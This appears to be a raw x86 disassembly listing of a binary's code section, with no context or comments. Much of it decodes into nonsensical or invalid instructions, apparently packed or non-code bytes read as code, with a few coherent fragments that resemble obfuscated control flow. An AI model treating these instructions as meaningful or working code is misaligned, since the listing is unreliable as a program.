  40191a:	shr    BYTE PTR [esi-0x6d],1
  40191d:	ins    BYTE PTR es:[edi],dx
  40191e:	push   esi
  40191f:	in     eax,0x6a
  401921:	dec    edx
  401922:	pop    esp
  401923:	push   ss
  401924:	dec    esi
  401925:	and    eax,DWORD PTR [edi-0x4bf6b220]
  40192b:	xchg   ebp,eax
  40192c:	cs (bad) 
  40192e:	mov    dl,0x96
  401930:	ret    0x22d0
  401933:	jp     0x401956
  401935:	push   es
  401936:	imul   ebx,DWORD PTR [ebp+0x49],0xffffff9e
  40193a:	dec    ecx
  40193b:	sub    cl,BYTE PTR [ebx-0x20]
  40193e:	loop   0x401960
  401940:	stos   DWORD PTR es:[edi],eax
  401941:	or     al,0x12
  401943:	mov    al,BYTE PTR [edi]
  401945:	fimul  DWORD PTR [edx+edi*1-0x73]
  401949:	out    0x2b,eax
  40194b:	add    ecx,DWORD PTR [ecx]
  40194d:	pop    ebp
  40194e:	bsr    ebx,DWORD PTR [edx-0x7831b5c7]
  401955:	mov    dh,0xea
  401957:	push   ebx
  401958:	dec    esp
  401959:	nop
  40195a:	ds int3 
  40195c:	aam    0x1f
  40195e:	and    al,0xef
  401960:	cmp    esp,ebp
  401962:	in     eax,0x83
  401964:	and    DWORD PTR [esi+0x305aeb91],ebp
  40196a:	xchg   esi,eax
  40196b:	inc    eax
  40196c:	bound  eax,QWORD PTR [ebp-0x635de63d]
  401972:	push   0x22
  401974:	in     eax,0x6b
  401976:	mov    ds:0xe76df928,eax
  40197b:	(bad)
  401980:	(bad)  
  401981:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401982:	cmc    
  401983:	inc    esi
  401984:	inc    ebx
  401985:	dec    esp
  401986:	rcl    cl,cl
  401988:	adc    edx,DWORD PTR [edx-0x1bb93b4f]
  40198e:	or     dh,dl
  401990:	push   ecx
  401991:	inc    edx
  401992:	mov    eax,0xe86ef133
  401997:	add    BYTE PTR [ecx+edi*2+0x2589cd3d],bh
  40199e:	xor    BYTE PTR ds:0xadd355ce,0xed
  4019a5:	lods   eax,DWORD PTR ds:[esi]
  4019a6:	add    eax,0x77cd6e5
  4019ab:	(bad)  
  4019ac:	jns    0x401990
  4019ae:	sub    eax,0x7d3dc233
  4019b3:	or     esi,DWORD PTR [esp+ecx*4+0x1d840f]
  4019ba:	add    BYTE PTR [eax],al
  4019bc:	mov    eax,DWORD PTR [ebp-0x10]
  4019bf:	add    DWORD PTR [eax],0x7403501
  4019c5:	jmp    0x4019d9
  4019ca:	mov    eax,DWORD PTR [ebp-0x1c]
  4019cd:	cmp    DWORD PTR [eax],0xf89f2da9
  4019d3:	jne    0x4019f4
  4019d9:	mov    eax,DWORD PTR [ebp-0x8]
  4019dc:	xor    eax,ecx
  4019de:	add    eax,esi
  4019e0:	test   eax,eax
  4019e2:	jne    0x4019f4
  4019e8:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  4019ef:	jmp    0x401169
  4019f4:	pop    ebx
  4019f5:	pop    edi
  4019f6:	pop    esi
  4019f7:	leave  
  4019f8:	ret    0x4
  4019fb:	push   ebp
  4019fc:	mov    ebp,esp
  4019fe:	sub    esp,0x18
  401a01:	leave  
  401a02:	ret    0x4
  401a05:	push   ebp
  401a06:	mov    ebp,esp
  401a08:	jmp    0x401dbe
  401a0d:	addr16 es out dx,eax
  401a10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a11:	ins    DWORD PTR es:[edi],dx
  401a12:	jne    0x401a89
  401a14:	out    0xa4,al
  401a16:	cmp    ebp,DWORD PTR [ebx+0x60]
  401a19:	dec    ebp
  401a1a:	jo     0x4019d2
  401a1c:	mov    eax,ds:0x70707ba4
  401a21:	xchg   edi,eax
  401a22:	jge    0x401a94
  401a24:	jo     0x4019d9
  401a26:	jae    0x4019d4
  401a28:	nop
  401a29:	mov    ecx,0xc62f1f00
  401a2e:	aam    0x33
  401a30:	pop    es
  401a31:	jg     0x401a85
  401a33:	and    eax,0xcc8f89eb
  401a38:	call   FWORD PTR [ecx-0x59]
  401a3b:	shr    esi,cl
  401a3d:	out    0x30,al
  401a3f:	add    ebp,DWORD PTR [ebx]
  401a41:	pop    es
  401a42:	jge    0x401a8b
  401a44:	or     al,0xe9
  401a46:	fadd   QWORD PTR ds:[edi+0x27]
  401a4a:	push   0xffffffde
  401a4c:	int3   
  401a4d:	ror    BYTE PTR ds:0x7bf6b55,cl
  401a53:	fwait
  401a54:	or     eax,0x727e17bd
  401a59:	jns    0x401a0d
  401a5b:	xchg   edx,eax
  401a5c:	xchg   esp,eax
  401a5d:	dec    edx
  401a5e:	(bad)  
  401a5f:	push   ebp
  401a60:	push   edi
  401a61:	adc    al,0x80
  401a63:	mov    bh,0xcb
  401a65:	dec    ebp
  401a66:	int3   
  401a67:	ja     0x401a02
  401a69:	mov    WORD PTR [ecx+esi*8-0x2c19dccf],?
  401a70:	pop    ss
  401a71:	or     eax,0xeeb506fe
  401a76:	pop    es
  401a77:	add    BYTE PTR [ecx-0x5fc18a7a],bl
  401a7d:	popa   
  401a7e:	or     ebx,eax
  401a80:	jne    0x401a9b
  401a82:	arpl   WORD PTR [edi+0x19fdeb6f],dx
  401a88:	add    dl,BYTE PTR [edx-0x8109d9]
  401a8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a8f:	mov    ss,WORD PTR ds:0x2a06b400
  401a95:	xchg   ecx,eax
  401a96:	daa    
  401a97:	push   ecx
  401a98:	hlt    
  401a99:	jns    0x401b01
  401a9b:	xor    al,BYTE PTR [edi]
  401a9d:	inc    ebp
  401a9e:	fcmovne st,st(5)
  401aa0:	std    
  401aa1:	add    al,0x49
  401aa3:	xchg   esp,eax
  401aa4:	add    bh,BYTE PTR [edx]
  401aa6:	sub    al,0x5c
  401aa8:	pushf  
  401aa9:	imul   ebx,DWORD PTR [ebx+0x5],0x99899e52
  401ab0:	rol    BYTE PTR [ecx+ebp*4+0x60590669],1
  401ab7:	and    dh,ch
  401ab9:	mov    eax,0x3bc25f70
  401abe:	xchg   edi,eax
  401abf:	cmp    BYTE PTR [ebp-0x57],0x58
  401ac3:	adc    DWORD PTR ss:[eax+0x1d6a959d],eax
  401aca:	les    ebp,FWORD PTR [esi-0x63]
  401acd:	das    
  401ace:	gs sub al,0x5f
  401ad1:	cmc    
  401ad2:	jle    0x401aa7
  401ad4:	loop   0x401b27
  401ad6:	(bad)  
  401ad7:	jp     0x401b0b
  401ad9:	je     0x401ade
  401adb:	mov    ebp,0x4f7d339d
  401ae0:	pusha  
  401ae1:	das    
  401ae2:	xchg   esi,eax
  401ae3:	pushf  
  401ae4:	inc    ebp
  401ae5:	or     DWORD PTR [eax],esp
  401ae7:	cmp    ah,ch
  401ae9:	pusha  
  401aea:	push   ss
  401aeb:	mov    WORD PTR [edi+eax*2],?
  401aee:	cli    
  401aef:	fisub  DWORD PTR [ebx+eax*2]
  401af2:	push   esi
  401af3:	ss push ss
  401af5:	repz xor edx,DWORD PTR [esi+edx*4+0x38]
  401afa:	dec    edi
  401afb:	cli    
  401afc:	pushf  
  401afd:	mov    dl,0x53
  401aff:	out    0x71,eax
  401b01:	sub    BYTE PTR [eax],bl
  401b03:	fadd   st,st(1)
  401b05:	imul   esi,DWORD PTR [edx],0x51f25cfa
  401b0b:	dec    ecx
  401b0c:	inc    ebx
  401b0d:	mov    DWORD PTR [edx-0x1f],ebp
  401b10:	push   ebx
  401b11:	xor    DWORD PTR [ecx-0x3dc2a63c],ebx
  401b17:	loopne 0x401b6a
  401b19:	jns    0x401b5a
  401b1b:	jecxz  0x401aa1
  401b1d:	inc    esi
  401b1e:	retf   0xee1b
  401b21:	pop    ss
  401b22:	mov    cl,0x53
  401b24:	ror    DWORD PTR [esi-0x1d327cd3],0xf
  401b2b:	add    BYTE PTR [eax-0x2d],dl
  401b2e:	dec    ecx
  401b2f:	adc    eax,0x415a16cc
  401b34:	hlt    
  401b35:	sahf   
  401b36:	scas   eax,DWORD PTR es:[edi]
  401b37:	sub    dl,bh
  401b39:	xor    eax,0x5c96b588
  401b3e:	adc    BYTE PTR [esi-0x623d6f72],cl
  401b44:	mov    eax,0x7630b744
  401b49:	cmp    ch,BYTE PTR [eax+0x207fc32e]
  401b4f:	mov    edi,DWORD PTR [ebp-0x46]
  401b52:	jle    0x401bd0
  401b54:	ret    0xc6f8
  401b57:	test   ebp,ebp
  401b59:	std    
  401b5a:	stos   DWORD PTR es:[edi],eax
  401b5b:	stos   WORD PTR es:[edi],ax
  401b5d:	add    ebp,ebp
  401b5f:	adc    DWORD PTR [ebx+0x5566e010],ebp
  401b65:	or     ah,BYTE PTR [edi+0x71dd149]
  401b6b:	pop    ebp
  401b6c:	sbb    ecx,DWORD PTR ds:0x4a9cb284
  401b72:	test   al,0xba
  401b74:	repz cmp edi,DWORD PTR [edx-0xa]
  401b78:	push   edx
  401b79:	out    dx,eax
  401b7a:	mov    ecx,DWORD PTR [ebp+0x2835c0c]
  401b80:	add    eax,0xafaa7a50
  401b85:	and    edi,DWORD PTR [ebx]
  401b87:	test   DWORD PTR [esi-0x556d0894],ecx
  401b8d:	out    0x91,eax
  401b8f:	mov    ah,0xf8
  401b91:	adc    dl,BYTE PTR [ecx+0x7ec0b69f]
  401b97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b98:	or     BYTE PTR [eax],0x78
  401b9b:	dec    BYTE PTR [ebp-0x1e]
  401b9e:	lds    esi,FWORD PTR [ecx-0x3f]
  401ba1:	xchg   ecx,eax
  401ba2:	pop    ss
  401ba3:	adc    al,0xb
  401ba5:	inc    edi
  401ba6:	mov    ch,0x3
  401ba8:	jp     0x401b85
  401baa:	sbb    eax,0x535e32e3
  401baf:	mov    edx,DWORD PTR [ebx+eax*4+0x309daeec]
  401bb6:	add    eax,0x746e641d
  401bbb:	lea    ebx,[ebx]
  401bbd:	push   edx
  401bbe:	and    DWORD PTR [ecx+edi*1+0x3148b720],eax
  401bc5:	ins    DWORD PTR es:[edi],dx
  401bc6:	call   0x12f75642
  401bcb:	test   eax,0x8d307bea
  401bd0:	cmp    BYTE PTR [esi-0x694a41ed],bh
  401bd6:	xchg   edi,eax
  401bd7:	and    bh,BYTE PTR [ecx]
  401bd9:	xor    eax,0x9ef0f800
  401bde:	sahf   
  401bdf:	les    eax,FWORD PTR [ebx+0x264d5a29]
  401be5:	fucom  st(7)
  401be7:	div    BYTE PTR [ebx]
  401be9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bea:	dec    edi
  401beb:	mov    dl,0xad
  401bed:	mov    bl,0xe6
  401bef:	xchg   esi,eax
  401bf0:	sub    BYTE PTR [ebp+0x38dcec45],ch
  401bf6:	adc    bl,BYTE PTR [edx-0x7b]
  401bf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bfa:	into   
  401bfb:	push   ebp
  401bfc:	mov    al,ds:0xb2072227
  401c01:	push   esp
  401c02:	ds (bad) 
  401c04:	jnp    0x401bc6
  401c06:	inc    ecx
  401c07:	cmp    BYTE PTR [ebp-0x31f0dfe5],cl
  401c0d:	shl    DWORD PTR [ebp+0x21476231],0x13
  401c14:	jmp    0x401c78
  401c16:	pop    eax
  401c17:	cmc    
  401c18:	out    0xfb,al
  401c1a:	dec    edi
  401c1b:	loop   0x401c20
  401c1d:	jmp    0x401bca
  401c1f:	pop    ebp
  401c20:	or     eax,0xc4627314
  401c25:	int3   
  401c26:	mov    dl,0xfe
  401c28:	in     eax,dx
  401c29:	and    DWORD PTR [edi-0x49],0xffffffa2
  401c2d:	pop    eax
  401c2e:	stc    
  401c2f:	jp     0x401bd1
  401c31:	jp     0x401bdc
  401c33:	fdiv   QWORD PTR [eax-0x64]
  401c36:	or     BYTE PTR [ebp+0x6e],ah
  401c39:	xchg   DWORD PTR [esi+edx*1+0x4deb1e80],ebp
  401c40:	cmp    ecx,esi
  401c42:	adc    BYTE PTR [ebx],0xfe
  401c45:	inc    edx
  401c46:	mov    ?,ebx
  401c48:	xor    ebp,esi
  401c4a:	inc    edi
  401c4b:	and    bl,BYTE PTR [ecx-0x6d4204a9]
  401c51:	mov    ebp,0xbcaab871
  401c56:	mov    edx,0x5e27ac53
  401c5b:	fnstcw WORD PTR [eax-0x14]
  401c5e:	jp     0x401c8d
  401c60:	retf   0xae8a
  401c63:	ins    BYTE PTR es:[edi],dx
  401c64:	(bad)
  401c67:	mov    esi,0x359df1f5
  401c6c:	jae    0x401ce7
  401c6e:	mov    al,ds:0x451ae7a4
  401c73:	out    0x3f,al
  401c75:	xlat   BYTE PTR ds:[ebx]
  401c76:	push   ss
  401c77:	sub    cl,ah
  401c79:	mov    cl,0x89
  401c7b:	imul   edi,DWORD PTR [edx+ebx*2+0x5cea1671],0xffffffc5
  401c83:	or     edi,0x12817a4c
  401c89:	test   ebx,esp
  401c8b:	nop
  401c8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c8d:	push   ebp
  401c8e:	bound  esi,QWORD PTR [ebx-0x7e82c3a8]
  401c94:	jmp    0x401cc7
  401c96:	es out dx,al
  401c98:	push   ss
  401c99:	cmp    dh,dh
  401c9b:	stc    
  401c9c:	mov    edi,DWORD PTR [esi+ebp*8+0x77]
  401ca0:	mov    ecx,0x3def4130
  401ca5:	imul   esi,esp,0x43
  401ca8:	pushf  
  401ca9:	sbb    al,0xc
  401cab:	jnp    0x401c49
  401cad:	xchg   esp,eax
  401cae:	and    DWORD PTR [edi-0x64],ecx
  401cb1:	mov    bl,0x25
  401cb3:	sahf   
  401cb4:	jo     0x401cb2
  401cb6:	mov    dl,0x91
  401cb8:	sub    edx,DWORD PTR [edi+0x43]
  401cbb:	in     eax,0x8f
  401cbd:	mov    DWORD PTR [ecx+0x15249e79],edx
  401cc3:	aam    0x2f
  401cc5:	xchg   BYTE PTR [edx],dh
  401cc7:	add    dl,BYTE PTR [edi+0x405c21b0]
  401ccd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cce:	in     al,0x5f
  401cd0:	jae    0x401d39
  401cd2:	sub    eax,0x71fa9c0a
  401cd7:	sub    cl,BYTE PTR [edx-0x65]
  401cda:	leave  
  401cdb:	mov    al,ds:0xda56c5a3
  401ce0:	pusha  
  401ce1:	(bad)  
  401ce2:	xor    BYTE PTR [edx+ebx*8],0x5d
  401ce6:	xchg   ebp,eax
  401ce7:	retf   0xabec
  401cea:	push   ebx
  401ceb:	aam    0xee
  401ced:	pop    edx
  401cee:	mov    edx,0x16141b47
  401cf3:	test   DWORD PTR [edi+0x3f1ef664],ebx
  401cf9:	jl     0x401cd5
  401cfb:	ret    
  401cfc:	sti    
  401cfd:	add    BYTE PTR [esi+0x24a3443b],ch
  401d03:	adc    ch,ah
  401d05:	jle    0x401cd9
  401d07:	test   al,0xe9
  401d09:	pop    es
  401d0a:	or     eax,DWORD PTR [esi]
  401d0c:	adc    eax,0x1a6a35d3
  401d11:	in     al,0xf
  401d13:	push   cs
  401d14:	push   ds
  401d15:	inc    BYTE PTR [edi+ebp*8]
  401d18:	fwait
  401d19:	xchg   ebx,eax
  401d1a:	dec    edi
  401d1b:	mov    bh,0xc0
  401d1d:	dec    edi
  401d1e:	mov    ecx,0xf1441a13
  401d23:	mov    ds:0x2c0c5898,eax
  401d28:	mov    dh,al
  401d2a:	ret    
  401d2b:	pop    edx
  401d2c:	pop    edi
  401d2d:	sbb    eax,0xb1293d7e
  401d32:	pop    ebx
  401d33:	pop    esp
  401d34:	retf   0x9d8a
  401d37:	pop    ss
  401d38:	jg     0x401ce1
  401d3a:	sbb    eax,0x653b62d4
  401d3f:	adc    al,0xcf
  401d41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d42:	add    al,0x30
  401d44:	loop   0x401d1f
  401d46:	xor    eax,DWORD PTR [edi]
  401d48:	push   eax
  401d49:	mov    ecx,DWORD PTR [edi+0x1a]
  401d4c:	jl     0x401d1e
  401d4e:	xor    bh,dh
  401d50:	xor    ebp,0xffffffa9
  401d53:	stc    
  401d54:	int    0xa6
  401d56:	pop    es
  401d57:	lahf   
  401d58:	retf   0xec6
  401d5b:	out    dx,eax
  401d5c:	scas   eax,DWORD PTR es:[edi]
  401d5d:	(bad)  
  401d5e:	sub    al,0x38
  401d60:	push   ds
  401d61:	inc    eax
  401d62:	inc    ebx
  401d63:	add    BYTE PTR [edx+0xe],al
  401d66:	je     0x401d59
  401d68:	shr    BYTE PTR [ecx+edx*1],1
  401d6b:	ficomp DWORD PTR [edx-0x1e6390d9]
  401d71:	loope  0x401d05
  401d73:	test   BYTE PTR [edx+edi*8+0x5f],ch
  401d77:	inc    edi
  401d78:	icebp  
  401d79:	inc    eax
  401d7a:	daa    
  401d7b:	and    edx,eax
  401d7d:	pushf  
  401d7e:	lods   eax,DWORD PTR ds:[esi]
  401d7f:	mov    bh,BYTE PTR ds:0xedefc351
  401d85:	ja     0x401d0b
  401d87:	pusha  
  401d88:	cmc    
  401d89:	xchg   ch,ah
  401d8b:	xchg   BYTE PTR [edi],bl
  401d8d:	inc    esp
  401d8e:	int    0x99
  401d90:	xchg   ebp,eax
  401d91:	pushf  
  401d92:	in     eax,0x87
  401d94:	inc    edi
  401d95:	and    DWORD PTR ds:0x27282647,0x12315a95
  401d9f:	aaa    
  401da0:	dec    esp
  401da1:	aam    0xb2
  401da3:	pop    edi
  401da4:	jle    0x401d4a
  401da6:	cmovl  eax,DWORD PTR [ebx+edx*2]
  401daa:	cmp    BYTE PTR [edi+0xf51a88b],dh
  401db0:	xchg   ebp,eax
  401db1:	jecxz  0x401d57
  401db3:	in     eax,dx
  401db4:	jb     0x401da3
  401db6:	add    eax,0xd5454c18
  401dbb:	push   ebx
  401dbc:	pop    ebx
  401dbd:	stos   BYTE PTR es:[edi],al
  401dbe:	push   ecx
  401dbf:	push   ecx
  401dc0:	xor    DWORD PTR ds:0x434366,ebx
  401dc6:	mov    eax,0xf89c8531
  401dcb:	sub    DWORD PTR ds:0x432dde,ebx
  401dd1:	mov    DWORD PTR [ebp-0x8],eax
  401dd4:	sbb    DWORD PTR ds:0x432dce,0x43436e
  401dde:	jmp    0x402194
  401de3:	add    ebx,DWORD PTR [ebx-0x2398ef41]
  401de9:	arpl   WORD PTR [ebx-0x6e9fb147],sp
  401def:	sub    DWORD PTR [ebp+0x6a],ecx
  401df2:	mov    esi,0x7070073b
  401df7:	xchg   edi,eax
  401df8:	jge    0x401e6a
  401dfa:	jo     0x401d91
  401dfc:	push   ebp
  401dfd:	out    dx,eax
  401dfe:	jl     0x401e20
  401e00:	and    BYTE PTR [esi],0xe2
  401e03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e04:	mov    ds:0x25678d78,al
  401e09:	jmp    0x3ee36db0
  401e0e:	ss js  0x401d93
  401e11:	xor    DWORD PTR [ecx],esp
  401e13:	and    DWORD PTR [eax+0x700aa1f9],ebx
  401e19:	jmp    0xb1e5:0x24c2c11d
  401e20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e21:	sbb    DWORD PTR ds:[ebx+0x45],esi
  401e25:	push   es
  401e26:	iret   
  401e27:	add    esp,DWORD PTR [edx+0x60]
  401e2a:	lds    edi,FWORD PTR [ebp-0x37]
  401e2d:	aaa    
  401e2e:	(bad)  
  401e30:	loope  0x401e1d
  401e32:	icebp  
  401e33:	test   BYTE PTR [ebp-0x7b],dh
  401e36:	and    BYTE PTR [esi+0x45],dl
  401e39:	jg     0x401e21
  401e3b:	in     eax,0xd6
  401e3d:	es pop edx
  401e3f:	call   0x9f01:0x7aa0c92
  401e46:	mov    bl,0x3b
  401e48:	dec    ebx
  401e49:	pop    eax
  401e4a:	xor    edx,DWORD PTR [ebp-0x62]
  401e4d:	shl    DWORD PTR [ecx],cl
  401e4f:	shl    DWORD PTR [ecx],cl
  401e51:	xor    BYTE PTR [eax+0x2f],cl
  401e54:	das    
  401e55:	into   
  401e56:	jg     0x401e9f
  401e58:	retf   0x506d
  401e5b:	sub    eax,0xc5834432
  401e60:	retf   0xa525
  401e63:	or     ebx,DWORD PTR [ecx+0x58]
  401e66:	mov    edx,0xeeef33bb
  401e6b:	xchg   ebx,eax
  401e6c:	add    ecx,edx
  401e6e:	or     al,0x21
  401e70:	jo     0x401e51
  401e72:	pop    ss
  401e73:	dec    esp
  401e74:	ja     0x401e02
  401e76:	out    dx,eax
  401e77:	into   
  401e78:	imul   eax,DWORD PTR [ebx+0x3fc0d2f1],0x1c
  401e7f:	cmp    DWORD PTR [esp+edi*4+0x14be7dc3],esp
  401e86:	in     al,dx
  401e87:	test   al,0xe2
  401e89:	and    eax,0xd568199f
  401e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e90:	mov    ds:0x9e699b9d,eax
  401e95:	jge    0x401e55
  401e97:	push   eax
  401e98:	fnstsw WORD PTR [edi+0x2]
  401e9b:	int    0x83
  401e9d:	sbb    BYTE PTR [edx-0x48],dh
  401ea0:	aaa    
  401ea1:	fcomi  st,st(7)
  401ea3:	pop    esp
  401ea4:	add    DWORD PTR [eax-0x79],ebp
  401ea7:	sti    
  401ea8:	stos   DWORD PTR es:[edi],eax
  401ea9:	lods   al,BYTE PTR ds:[esi]
  401eaa:	push   esi
  401eab:	ror    BYTE PTR [eax-0x61],0x56
  401eaf:	mov    ebx,0xff59bfaf
  401eb4:	cmp    eax,0x8273e33f
  401eb9:	adc    esp,esp
  401ebb:	fisttp WORD PTR [ebx+0x5d]
  401ebe:	fucomi st,st(2)
  401ec0:	xchg   esp,eax
  401ec1:	repnz gs out dx,al
  401ec4:	dec    eax
  401ec5:	jg     0x401e80
  401ec7:	mov    al,ds:0xe23204cd
  401ecc:	inc    esp
  401ecd:	add    dh,BYTE PTR [edx+0xe2b6370]
  401ed3:	loopne 0x401f06
  401ed5:	(bad)
  401ed8:	aad    0xf8
  401eda:	jb     0x401f3f
  401edc:	xor    DWORD PTR [bx+0x388],eax
  401ee1:	ds push esi
  401ee3:	(bad)  
  401ee4:	loope  0x401e6c
  401ee6:	or     DWORD PTR [edx+0x530b67c5],esp
  401eec:	inc    ecx
  401eed:	int    0x91
  401eef:	dec    esi
  401ef0:	pop    edi
  401ef1:	neg    BYTE PTR [ecx+0xc]
  401ef4:	inc    edi
  401ef5:	pop    ss
  401ef6:	loopne 0x401f47
  401ef8:	adc    eax,0xf38e6ad1
  401efd:	daa    
  401efe:	mov    esp,0xaa3d92c2
  401f03:	mov    ah,dl
  401f05:	lahf   
  401f06:	cmp    al,0x99
  401f08:	icebp  
  401f09:	add    eax,0x538c9dc7
  401f0e:	or     DWORD PTR [ebx+ebx*8],ebp
  401f11:	out    dx,al
  401f12:	and    esp,ecx
  401f14:	or     BYTE PTR [eax+edi*1-0x5f],0xfe
  401f19:	icebp  
  401f1a:	sar    esp,0x31
  401f1d:	mov    esp,0x41d007b8
  401f22:	push   esi
  401f23:	xchg   esp,eax
  401f24:	xchg   edx,eax
  401f25:	push   esi
  401f26:	push   ebx
  401f27:	cmp    eax,0xecce7ba
  401f2c:	inc    edi
  401f2d:	push   eax
  401f2e:	fmulp  st(3),st
  401f30:	bound  esi,QWORD PTR [esi+eiz*1]
  401f33:	adc    eax,0xf6751ad3
  401f38:	mov    bh,0x5c
  401f3a:	pop    edx
  401f3b:	int3   
  401f3c:	xor    eax,0xa1eb631
  401f41:	ins    BYTE PTR es:[edi],dx
  401f42:	jg     0x401f94
  401f44:	lea    ebx,[edx+eiz*4]
  401f47:	and    bh,BYTE PTR [ebx+ecx*8-0x55]
  401f4b:	cmp    DWORD PTR [esi-0x3f],eax
  401f4e:	xchg   edi,eax
  401f4f:	mov    cl,0x4d
  401f51:	lods   eax,DWORD PTR ds:[esi]
  401f52:	test   BYTE PTR ds:0xd4ff10e,al
  401f58:	xor    eax,DWORD PTR [edx+0x5011ef1f]
  401f5e:	pop    edi
  401f5f:	leave  
  401f60:	clc    
  401f61:	lods   eax,DWORD PTR ds:[esi]
  401f62:	sbb    DWORD PTR [esi+0x7b],ebp
  401f65:	sub    ecx,DWORD PTR [edx]
  401f67:	mov    bl,0x9b
  401f69:	out    dx,al
  401f6a:	adc    eax,0xb4e1f382
  401f6f:	pop    ebp
  401f70:	lock xor dl,BYTE PTR [edx]
  401f73:	sti    
  401f74:	ds enter 0xb9f8,0xf4
  401f79:	rcl    BYTE PTR [ebx],0xa2
  401f7c:	and    bh,ch
  401f7e:	mov    edi,0x4c7e64d3
  401f83:	aas    
  401f84:	cmp    cl,BYTE PTR [ebp+0x2]
  401f87:	jp     0x401f55
  401f89:	jb     0x401ff9
  401f8b:	push   esi
  401f8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f8d:	pop    edi
  401f8e:	inc    edi
  401f8f:	imul   ebx,DWORD PTR [esi-0x57],0xffffffec
  401f93:	dec    ebx
  401f94:	fs sub eax,0xcc1316b2
  401f9a:	loop   0x401f7a
  401f9c:	add    bh,BYTE PTR [edx+0x538481a8]
  401fa2:	bnd jl 0x401ff1
  401fa5:	jge    0x401f35
  401fa7:	adc    al,0x7c
  401fa9:	jg     0x401f5a
  401fab:	icebp  
  401fac:	and    al,0x2b
  401fae:	jns    0x402006
  401fb0:	mov    dh,0x72
  401fb2:	call   0xe9080174
  401fb7:	mov    ecx,0xf57f53d8
  401fbc:	addr16 jg 0x401f95
  401fbf:	pusha  
  401fc0:	push   ebx
  401fc1:	adc    DWORD PTR [ebp+0x221909d1],edi
  401fc7:	cmc    
  401fc8:	ss pop edx
  401fca:	push   cs
  401fcb:	leave  
  401fcc:	push   ebp
  401fcd:	add    eax,DWORD PTR [edi+edx*2-0x8b08d4e]
  401fd4:	sbb    dl,BYTE PTR [ecx+eax*2-0x3982c6bf]
  401fdb:	push   ss
  401fdc:	xor    esp,ebx
  401fde:	mov    bl,0xcc
  401fe0:	push   esp
  401fe1:	inc    esi
  401fe2:	ror    DWORD PTR [ebx+0x67],cl
  401fe5:	sbb    esi,DWORD PTR [ecx-0x21]
  401fe8:	out    dx,eax
  401fe9:	js     0x402058
  401feb:	dec    eax
  401fec:	push   0x63
  401fee:	xor    BYTE PTR [esp+esi*2],ah
  401ff1:	or     ebx,edx
  401ff3:	in     eax,dx
  401ff4:	out    0xb7,al
  401ff6:	nop
  401ff7:	(bad)  
  401ff8:	fdiv   QWORD PTR [edx]
  401ffa:	xor    al,0xe8
  401ffc:	outs   dx,BYTE PTR ds:[esi]
  401ffd:	xor    esp,DWORD PTR [ecx]
  401fff:	push   cs
  402000:	mov    DWORD PTR [eax],eax
  402002:	fiadd  DWORD PTR ds:0xd56341ea
  402008:	pushf  
  402009:	mov    DWORD PTR [edi+0x59df80f3],edi
  40200f:	xchg   ecx,eax
  402010:	pushf  
  402011:	xor    al,0x5d
  402013:	outs   dx,DWORD PTR ds:[esi]
  402014:	(bad)  
  402015:	xchg   edi,eax
  402016:	ins    DWORD PTR es:[edi],dx
  402017:	scas   al,BYTE PTR es:[edi]
  402018:	aaa    
  402019:	std    
  40201a:	cmc    
  40201b:	mov    ebp,0xd852cba9
  402020:	or     al,0xf4
  402022:	mov    edi,0x8494ba2a
  402027:	dec    ecx
  402028:	pop    ds
  402029:	retf   
  40202a:	pop    esp
  40202b:	mov    bh,0x19
  40202d:	xor    esp,DWORD PTR [ebx+0x6ea21158]
  402033:	cmp    BYTE PTR es:[esp+eax*4-0x6f2b01f6],0x39
  40203c:	xchg   ecx,eax
  40203d:	mul    ebx
  40203f:	cmp    BYTE PTR [esi-0x6b],cl
  402042:	cwde   
  402043:	or     esi,DWORD PTR [ebx+0x3b0b07ce]
  402049:	gs add eax,0x8e22d083
  40204f:	add    dh,BYTE PTR [edi]
  402051:	mov    ebx,0xe62f8e34
  402056:	xchg   bx,ax
  402058:	mov    ebp,0xf71e99e4
  40205d:	gs addr16 xor eax,0x214608e
  402064:	mov    esp,0x1bce5df8
  402069:	loopne 0x40208a
  40206b:	imul   esi,DWORD PTR [edx+0x51],0x6cb45602
  402072:	sub    BYTE PTR [esi-0x7b],bl
  402075:	shr    BYTE PTR [ebx+0x6fcb30e7],0x93
  40207c:	neg    DWORD PTR [ebx+0x47]
  40207f:	mov    al,ds:0xc56c6485
  402084:	cmp    esp,DWORD PTR [eax]
  402086:	mov    ebx,0xdc1aa9d8
  40208b:	ret    0xdb4d
  40208e:	int    0x95
  402090:	sbb    BYTE PTR [ecx],ch
  402092:	popa   
  402093:	cmp    eax,0xdb26365c
  402098:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402099:	lock pop ebp
  40209b:	inc    esp
  40209c:	cli    
  40209d:	pop    es
  40209e:	fild   QWORD PTR [esi+edi*2-0x1b863139]
  4020a5:	outs   dx,BYTE PTR ds:[esi]
  4020a6:	mov    al,ds:0x9de0e42f
  4020ab:	or     eax,0x6b5e9c16
  4020b0:	add    al,0x37
  4020b2:	in     eax,0x14
  4020b4:	cwde   
  4020b5:	sub    esp,DWORD PTR [edi]
  4020b7:	outs   dx,BYTE PTR ds:[esi]
  4020b8:	int    0xf9
  4020ba:	in     al,0xa7
  4020bc:	enter  0x8bbb,0x5e
  4020c0:	mov    esi,0xc42f5d37
  4020c5:	mov    edx,DWORD PTR [edi+edi*4+0x1c53caec]
  4020cc:	fdivr  QWORD PTR [ebp+0x755b76a1]
  4020d2:	movd   DWORD PTR [eax],mm3
  4020d5:	pusha  
  4020d6:	mov    esp,0xce5cfc3d
  4020db:	jo     0x4020e4
  4020dd:	adc    edx,esp
  4020df:	sub    BYTE PTR [esi+0x70ac5a7e],0xb1
  4020e6:	in     eax,0x5e
  4020e8:	push   edi
  4020e9:	jle    0x402151
